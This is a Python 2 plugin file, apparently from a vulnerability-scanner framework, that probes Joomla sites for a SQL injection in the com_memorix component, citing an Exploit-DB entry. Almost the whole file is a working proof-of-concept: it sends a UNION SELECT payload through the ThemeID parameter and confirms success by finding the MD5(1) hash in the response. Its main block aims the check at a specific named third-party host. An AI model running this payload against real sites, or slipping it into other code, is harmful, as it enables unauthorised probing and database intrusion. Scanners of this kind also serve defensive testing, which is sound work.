#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ximumu
#_Function_ = 插件格式
#_FileName_ = cms_joomla_sqlinjecttion.py
#__Refer___ = https://www.exploit-db.com/exploits/37773/
#___Flag___ = 438b1eb36b7e244b
import re
from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg
        set_payload = 'index.php?option=com_memorix&task=result&searchplugin=theme&Itemid=60&ThemeID=-8594+union+select+111,222,MD5(1),444,555,666,777,888,999--+AbuHassan'
        code, head, res, errcode, _ = curl.curl(url + set_payload)
        if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            output(url,result,'info')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_f529437f40cc636d5ddaeedcc9d910de.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_f529437f40cc636d5ddaeedcc9d910de.py
#/root/github/poccreate/codesrc/exp-1365.py